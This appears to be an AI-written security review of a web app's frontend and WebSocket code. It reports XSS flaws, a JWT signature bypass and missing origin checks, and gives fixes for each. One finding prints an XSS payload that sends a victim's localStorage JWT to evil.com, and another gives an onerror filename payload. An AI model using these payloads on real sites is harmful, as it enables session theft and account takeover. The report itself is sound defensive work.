# Frontend + WebSocket Security Review Report

**Reviewer:** Kimi Claw  
**Date:** 2026-05-20  
**Scope:** All HTML files in `v3/public/`, `websocket.js`, `server.js` config, `Dockerfile`

---

## Executive Summary

Backend security (auth, rate limiting, input validation) is **solid** thanks to GCSC ClawDesctop's earlier work. However, **frontend has multiple XSS vulnerabilities** that allow any authenticated user to inject malicious scripts. Additionally, **WebSocket authentication is completely broken** — JWT signatures are not verified, allowing anyone to impersonate any user.

| Severity | Count | Issues |
|----------|-------|--------|
| **CRITICAL** | 1 | WebSocket JWT signature bypass |
| **HIGH** | 3 | XSS in messages, toast, project/contractor rendering |
| **MEDIUM** | 5 | CSP inline script block, duplicate script, file upload XSS, WS origin, WS overwrite |
| **LOW** | 3 | localStorage JWT, hardcoded API, no frontend rate limit |

---

## CRITICAL

### WS-001: WebSocket JWT Signature Not Verified
**File:** `v3/websocket.js`  
**Function:** `verifyToken()`

```javascript
verifyToken(token) {
  const parts = token.split('.');
  if (parts.length !== 3) throw new Error('Invalid token');
  const payload = JSON.parse(Buffer.from(parts[1].replace(/-/g,'+').replace(/_/g,'/'), 'base64').toString());
  if (payload.exp < Math.floor(Date.now()/1000)) throw new Error('Expired');
  return payload;
}
```

**Problem:** Only decodes the payload from base64. **Never verifies the HMAC signature** with `JWT_SECRET`.  
**Impact:** Anyone can craft a fake JWT with any `userId` and connect to WebSocket as any user. Full authentication bypass.  
**Fix:** Use `jwt.verify(token, JWT_SECRET, { algorithms: ['HS256'] })` — same as `requireAuth` in `server.js`.

---

## HIGH

### FRONT-001: XSS in Message Rendering (Both Dashboards)
**Files:** `dashboard-homeowner.html`, `dashboard-contractor.html`

```javascript
list.innerHTML = msgs.map(m => `<div...>${m.sender_name || 'User'}</div><p>${m.content || ''}</p>`).join('');
```

**Problem:** `m.sender_name` and `m.content` are inserted directly into `innerHTML` without escaping.  
**Impact:** Any user can send a message containing `<img src=x onerror=fetch('https://evil.com?token='+localStorage.getItem('gcsc_token'))>` and steal the recipient's JWT token.  
**Fix:** Implement `escapeHtml()` function and use it for all user-generated content:
```javascript
function escapeHtml(text) {
  if (typeof text !== 'string') return '';
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
```

### FRONT-002: DOM-based XSS in showToast (All Pages)
**Files:** `login.html`, `register.html`, `dashboard-homeowner.html`, `dashboard-contractor.html`

```javascript
toast.innerHTML = `<i data-lucide="${icon}" class="w-5 h-5"></i><span>${message}</span>`;
```

**Problem:** `message` comes from API error responses (`err.message` → `data.error || data.message`). If backend returns HTML/script tags in error message, it executes in the DOM.  
**Impact:** DOM-based XSS if backend is compromised or returns unsanitized errors.  
**Fix:** Use `textContent` for the message span instead of `innerHTML`:
```javascript
toast.innerHTML = `<i data-lucide="${icon}" class="w-5 h-5"></i>`;
const span = document.createElement('span');
span.textContent = message;
toast.appendChild(span);
```

### FRONT-003: XSS in Project / Contractor / Bid Rendering
**Files:** `dashboard-homeowner.html`, `dashboard-contractor.html`

```javascript
tbody.innerHTML = filtered.map(p => `<tr><td>${p.title}</td><td>${p.category || ''}</td>...</tr>`).join('');
```

**Problem:** `p.title`, `p.description`, `p.category`, `p.location`, `c.name`, `c.company`, `c.specialty` — all API data inserted into `innerHTML` without escaping.  
**Impact:** If backend doesn't sanitize these fields (or if attacker finds a way to set them), XSS triggers on page load.  
**Fix:** Apply `escapeHtml()` to ALL interpolated values in template literals used with `innerHTML`.

---

## MEDIUM

### FRONT-004: CSP Blocks Inline Scripts (Future Risk)
**File:** `server.js`  
**Config:** `scriptSrc: ["'self'"]`

**Problem:** Helmet CSP allows only external scripts. All frontend HTML files contain extensive inline `<script>` tags. If backend ever serves static HTML directly, the entire frontend will be broken.  
**Fix:** Either:
- Add `'unsafe-inline'` to `scriptSrc` (quick fix, weaker CSP)
- Move all inline scripts to external `.js` files (proper fix)
- Use CSP nonces (advanced)

### FRONT-005: Duplicate Script Declaration (login.html)
**File:** `login.html`

**Problem:** `const API_BASE` and `async function api` are declared **twice** — once in `<head>` and once in `<body>`. In modern browsers, redeclaring `const` in global scope throws `SyntaxError: Identifier 'API_BASE' has already been declared`.  
**Impact:** Page may fail to load JavaScript entirely.  
**Fix:** Remove the duplicate script block from `<head>` (keep the one in `<body>`).

### FRONT-006: XSS in File Upload Display
**File:** `dashboard-homeowner.html`

```javascript
list.innerHTML = Array.from(input.files).map(f => `<div>${f.name}</div>`).join('');
```

**Problem:** `f.name` (user-controlled filename) inserted into `innerHTML` without escaping.  
**Impact:** User can upload a file named `<img src=x onerror=alert(1)>.txt` to trigger XSS.  
**Fix:** Escape `f.name` before inserting.

### WS-002: No WebSocket Origin Validation
**File:** `websocket.js`

**Problem:** `new WebSocket.Server({ server })` does not check `origin` header.  
**Impact:** Any malicious website can open a WebSocket connection to the backend.  
**Fix:** Add `verifyClient` option:
```javascript
new WebSocket.Server({ 
  server,
  verifyClient: (info) => {
    const origin = info.origin || info.req.headers.origin;
    return CORS_WHITELIST.includes(origin) || !origin;
  }
});
```

### WS-003: WebSocket Client Map Overwrite
**File:** `websocket.js`

**Problem:** `this.clients.set(payload.userId, ws)` — if same `userId` connects twice, first connection is silently overwritten.  
**Impact:** Attacker can kick out legitimate user by connecting with forged token (due to WS-001).  
**Fix:** Support multiple connections per user:
```javascript
// Change Map to Map<string, Set<WebSocket>>
if (!this.clients.has(userId)) this.clients.set(userId, new Set());
this.clients.get(userId).add(ws);
```

---

## LOW

### FRONT-007: JWT Stored in localStorage
**Files:** `login.html`, `register.html`, `dashboard-*.html`

**Problem:** `localStorage.setItem('gcsc_token', data.token)` — token accessible to any JavaScript on the page.  
**Impact:** If any XSS exists (FRONT-001..003), token is immediately stolen.  
**Fix:** Move to `httpOnly` cookies (requires backend cookie support). Short-term: at least add `escapeHtml()` everywhere.

### FRONT-008: Hardcoded API Base URL
**Files:** All HTML files

**Problem:** `const API_BASE = 'https://fifty-views-talk.loca.lt';` — localtunnel URLs expire.  
**Impact:** Frontend breaks when tunnel expires.  
**Fix:** Make configurable via `data-api-base` attribute or env variable at build time.

### FRONT-009: No Token Validation on Page Load
**Files:** `login.html`, `register.html`

**Problem:** Pages check `if (localStorage.getItem('gcsc_token'))` and redirect. They don't verify if token is still valid (not expired, not revoked).  
**Impact:** Expired/revoked token still redirects to dashboard, causing API failures.  
**Fix:** Make a lightweight `/api/me` call to validate token before redirect.

---

## GOOD PRACTICES OBSERVED ✅

| Area | Observation |
|------|-------------|
| **Dockerfile** | Non-root user (`nodejs:1001`), minimal `node:20-alpine` image, healthcheck configured |
| **Body Parser** | 100kb limit on JSON and URL-encoded bodies |
| **Global Errors** | `sendError()` never leaks stack traces or internal messages to client |
| **Helmet** | CSP, HSTS, X-Frame-Options, referrer policy all configured |
| **CORS** | Whitelist-based, `credentials: false`, proper preflight |
| **Rate Limiting** | General + registration + Stripe-specific tiers |
| **Input Validation** | Email validation via `validator.isEmail()`, role whitelist enforced |
| **DB Queries** | Parameterized queries (`$1`, `$2`) throughout backend routes |

---

## Recommended Fix Priority

1. **WS-001 (CRITICAL)** — Fix WebSocket JWT verification immediately
2. **FRONT-001 (HIGH)** — Escape all message content in both dashboards
3. **FRONT-002 (HIGH)** — Fix showToast to use textContent
4. **FRONT-003 (HIGH)** — Add escapeHtml() to all template literals with innerHTML
5. **FRONT-005 (MEDIUM)** — Remove duplicate script in login.html
6. **FRONT-006 (MEDIUM)** — Escape file names in upload display
7. **WS-002, WS-003 (MEDIUM)** — Add WebSocket origin validation and multi-connection support
8. **FRONT-004 (MEDIUM)** — Fix CSP for inline scripts

---

*Report generated by Kimi Claw — 2026-05-20*
